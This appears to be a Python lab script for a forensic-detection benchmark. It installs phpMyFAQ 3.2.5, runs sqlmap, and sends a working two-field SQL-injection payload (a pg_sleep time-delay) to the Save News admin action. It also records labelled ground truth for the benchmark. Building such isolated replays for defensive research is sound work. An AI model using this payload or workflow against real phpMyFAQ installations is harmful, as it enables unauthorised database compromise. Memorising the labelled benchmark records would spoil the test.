"""Prepare and execute the isolated phpMyFAQ SQL-injection scenario."""

from __future__ import annotations

import argparse
import hashlib
import json
import os
import socket
import subprocess
import sys
import time
from datetime import UTC, datetime, timedelta
from pathlib import Path
from urllib.parse import urlencode

import requests

sys.path.insert(0, "/opt/v2")

EDGE = "http://edge"
ATTACKER_IP = "192.0.2.131"


def timestamp() -> datetime:
    return datetime.now(UTC)


def step_time(value: datetime, delta_ms: int = 0) -> str:
    return (value + timedelta(milliseconds=delta_ms)).isoformat(timespec="microseconds")


def isolate() -> None:
    from background import target_url

    try:
        target_url("/", "outside-lab")
    except ValueError:
        print("non_allowlisted_service_refused=PASS")
    else:
        raise SystemExit("non_allowlisted_service_refused=FAIL")
    try:
        with socket.create_connection(("1.1.1.1", 443), timeout=2):
            raise SystemExit("external_address_unreachable=FAIL")
    except OSError:
        print("external_address_unreachable=PASS")


def prepare_application() -> None:
    session = requests.Session()
    headers = {"X-Lab-Client-IP": ATTACKER_IP, "User-Agent": "Mozilla/5.0 setup-check"}
    page = session.get(f"{EDGE}/setup/index.php", headers=headers, timeout=15)
    if page.status_code != 200 or "Database setup" not in page.text:
        raise RuntimeError(f"phpMyFAQ setup did not load (HTTP {page.status_code})")
    install = session.post(
        f"{EDGE}/setup/index.php",
        headers=headers,
        data={
            "sql_type": "pgsql",
            "sql_server": "pgdb",
            "sql_port": "5432",
            "sql_user": os.environ["MYSQL_USER"],
            "sql_password": os.environ["MYSQL_PASSWORD"],
            "sql_db": os.environ.get("MYSQL_DATABASE", "benchv2"),
            "sqltblpre": "",
            "language": "language_en.php",
            "permLevel": "basic",
            "realname": "Benchmark Admin",
            "email": "benchmark-admin@example.invalid",
            "loginname": os.environ["BENCH_ADMIN_USER"],
            "password": os.environ["BENCH_ADMIN_PASSWORD"],
            "password_retyped": os.environ["BENCH_ADMIN_PASSWORD"],
        },
        timeout=60,
    )
    if install.status_code != 200 or "worked like a charm" not in install.text:
        excerpt = install.text[-800:].replace("\n", " ")
        raise RuntimeError(f"phpMyFAQ setup failed (HTTP {install.status_code}): {excerpt}")
    home = session.get(f"{EDGE}/", headers=headers, timeout=15, allow_redirects=False)
    login = session.get(
        f"{EDGE}/admin/index.php?action=news",
        headers=headers,
        timeout=15,
        allow_redirects=False,
    )
    if home.status_code != 200 or "phpMyFAQ 3.2.5" not in home.text:
        raise RuntimeError(f"phpMyFAQ public page failed (HTTP {home.status_code})")
    if login.status_code != 200 or "faqusername" not in login.text:
        raise RuntimeError(f"phpMyFAQ admin login did not load (HTTP {login.status_code})")
    source = Path("/app-webroot/src/phpMyFAQ/News.php")
    if not source.is_file():
        raise RuntimeError("phpMyFAQ vulnerable source file is missing")
    source_sha256 = hashlib.sha256(source.read_bytes()).hexdigest()
    Path("/replay/setup-complete.json").write_text(
        json.dumps(
            {
                "application": "phpMyFAQ 3.2.5",
                "database": "PostgreSQL",
                "admin_created": True,
                "setup_response": install.status_code,
                "vulnerable_source_sha256": source_sha256,
                "vulnerable_source_line": 289,
            },
            indent=2,
        )
        + "\n",
        encoding="utf-8",
    )
    print("phpmyfaq_setup=PASS")


def perform_attack() -> None:
    ready = Path("/replay/background-halfway")
    continuation = Path("/replay/background-continue")
    for _ in range(9000):
        if ready.exists():
            break
        time.sleep(0.05)
    else:
        raise TimeoutError("background replay did not reach its seeded attack point")
    headers = {
        "X-Lab-Client-IP": ATTACKER_IP,
        "User-Agent": "M8-v2-phpMyFAQ-s03",
    }
    session = requests.Session()
    steps: list[dict[str, object]] = []

    def marked_get(step_id: str, path: str, expected: bool) -> requests.Response:
        response = session.get(
            f"{EDGE}{path}",
            headers={**headers, "X-Lab-Step": step_id},
            timeout=15,
            allow_redirects=False,
        )
        steps.append(
            {
                "id": step_id,
                "category": "reconnaissance" if not expected else "credential_access",
                "mitre": ["T1595"] if not expected else ["T1078"],
                "label_method": "header",
                "expected_in_timeline": expected,
            }
        )
        return response

    home = marked_get("site_check", "/", False)
    if home.status_code != 200:
        raise RuntimeError(f"site check returned HTTP {home.status_code}")
    news_login = marked_get("news_admin_probe", "/admin/index.php?action=news", False)
    if "faqusername" not in news_login.text:
        raise RuntimeError("news administration did not require authentication")

    login = session.post(
        f"{EDGE}/admin/index.php",
        headers={**headers, "X-Lab-Step": "editor_login"},
        data={
            "faqusername": os.environ["BENCH_ADMIN_USER"],
            "faqpassword": os.environ["BENCH_ADMIN_PASSWORD"],
            "redirect-action": "news",
        },
        timeout=15,
        allow_redirects=False,
    )
    if login.status_code != 200 or not session.cookies.get("PHPSESSID"):
        raise RuntimeError(f"editor login failed (HTTP {login.status_code})")
    steps.append(
        {
            "id": "editor_login",
            "category": "valid_account_access",
            "mitre": ["T1078"],
            "label_method": "header",
            "expected_in_timeline": True,
        }
    )
    form = marked_get("news_editor_open", "/admin/index.php?action=add-news", True)
    if form.status_code != 200 or "authorEmail" not in form.text:
        raise RuntimeError("authorized news editor form did not load")

    cookie = "; ".join(f"{item.name}={item.value}" for item in session.cookies)
    ordinary_data = urlencode(
        {
            "newsheader": "Safety update",
            "news": "Routine information update",
            "authorName": "Benchmark Admin",
            "authorEmail": "benchmark-admin@example.invalid",
            "active": "y",
            "comment": "n",
            "link": "",
            "linkTitle": "update",
            "langTo": "en",
            "dateStart": "",
            "dateEnd": "",
            "target": "self",
        }
    )
    sqlmap_started = timestamp()
    sqlmap = subprocess.run(
        [
            "python",
            "/opt/sqlmap/sqlmap.py",
            "-u",
            f"{EDGE}/admin/index.php?action=save-news",
            "--data",
            ordinary_data,
            "--cookie",
            cookie,
            "--headers",
            f"X-Lab-Client-IP: {ATTACKER_IP}",
            "--param-filter=POST",
            "-p",
            "authorEmail",
            "--technique=B",
            "--dbms=PostgreSQL",
            "--batch",
            "--flush-session",
            "--level=1",
            "--risk=1",
            "--threads=1",
            "--delay=0.05",
            "--timeout=5",
            "--retries=1",
            "--output-dir=/tmp/m8v2-s03-sqlmap",
        ],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        timeout=180,
        check=False,
    )
    sqlmap_output = sqlmap.stdout.lower()
    generic_detected = "appears to be injectable" in sqlmap_output
    Path("/replay/sqlmap-result.json").write_text(
        json.dumps(
            {
                "tool": "sqlmap",
                "pinned_commit": "c42ebd7acf47c88b6407995dd9842a2eb5d6534d",
                "exit_code": sqlmap.returncode,
                "tested_parameter": "authorEmail",
                "generic_detection": generic_detected,
                "reason_for_targeted_validation": (
                    "the maintainer advisory requires coordinated values across the "
                    "author email and link-title fields"
                ),
                "started_at": sqlmap_started.isoformat(timespec="microseconds"),
                "ended_at": timestamp().isoformat(timespec="microseconds"),
            },
            indent=2,
        )
        + "\n",
        encoding="utf-8",
    )

    # The maintainer's advisory documents this two-field time-delay proof. It executes
    # only a short database sleep and writes no file or operating-system command.
    exploit_fields = {
        "newsheader": "Safety update",
        "news": "Routine information update",
        "authorName": "Benchmark Admin",
        "authorEmail": "test'/*@email.com",
        "active": "y",
        "comment": "n",
        "link": "",
        "linkTitle": "*/,1,1,1,1,1,1,1);select pg_sleep(1)--",
        "langTo": "en",
        "dateStart": "",
        "dateEnd": "",
        "target": "self",
    }
    root_started = timestamp()
    response = session.post(
        f"{EDGE}/admin/index.php?action=save-news",
        headers={**headers, "X-Lab-Step": "save_news_sql_injection"},
        data=exploit_fields,
        timeout=15,
        allow_redirects=False,
    )
    ended = timestamp()
    elapsed = (ended - root_started).total_seconds()
    if response.status_code != 200 or elapsed < 0.90:
        raise RuntimeError(
            f"targeted SQL injection check failed (HTTP {response.status_code}, "
            f"elapsed={elapsed:.3f}s)"
        )
    steps.append(
        {
            "id": "save_news_sql_injection",
            "category": "sql_injection",
            "mitre": ["T1190"],
            "label_method": "header",
            "expected_in_timeline": True,
        }
    )
    setup = json.loads(Path("/replay/setup-complete.json").read_text(encoding="utf-8"))
    records = {
        "scenario_id": "s03",
        "description": (
            "An authenticated phpMyFAQ administrator account opens the news editor. "
            "A pinned sqlmap run performs a generic test that does not detect the "
            "cross-field flaw; a single maintainer-documented time-delay check then "
            "confirms SQL injection in Save News. The check delays one database query "
            "briefly and creates no server file."
        ),
        "attacker_ips": [ATTACKER_IP],
        "root_cause_step": "save_news_sql_injection",
        "steps": steps,
        "files": [
            {
                "path": f"data/tracking{datetime.now(UTC).strftime('%d%m%Y')}",
                "role": "application_runtime_data",
                "expected_in_report": True,
            }
        ],
        "vulnerable_code": {
            "file": "phpmyfaq/src/phpMyFAQ/News.php",
            "line": 289,
            "sha256": setup["vulnerable_source_sha256"],
            "vuln_class": "sql_injection",
            "advisory_url": "https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-qgxx-4xv5-6hcw",
        },
        "analysis": {
            "access_logs": ["access.log.gz"],
            "error_logs": ["app-error.log"],
            "error_log_format": "apache",
            "error_log_utc_offset": "+0000",
            "manifest": "manifest.tsv",
            "baseline": "baseline.tsv",
            "trusted_proxies": [],
        },
        "split": "dev",
        "expected_rule_ids": [],
    }
    Path("/replay/records.json").write_text(
        json.dumps(records, ensure_ascii=False, indent=2) + "\n", encoding="utf-8"
    )
    continuation.write_text("continue\n", encoding="ascii")
    print(
        json.dumps(
            {
                "attack_completed": True,
                "steps": len(steps),
                "sqlmap_generic_detection": generic_detected,
                "targeted_database_delay_seconds": round(elapsed, 3),
            },
            sort_keys=True,
        )
    )


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("action", choices=("isolation", "setup", "attack"))
    action = parser.parse_args().action
    if action == "isolation":
        isolate()
    elif action == "setup":
        prepare_application()
    else:
        perform_attack()


if __name__ == "__main__":
    main()
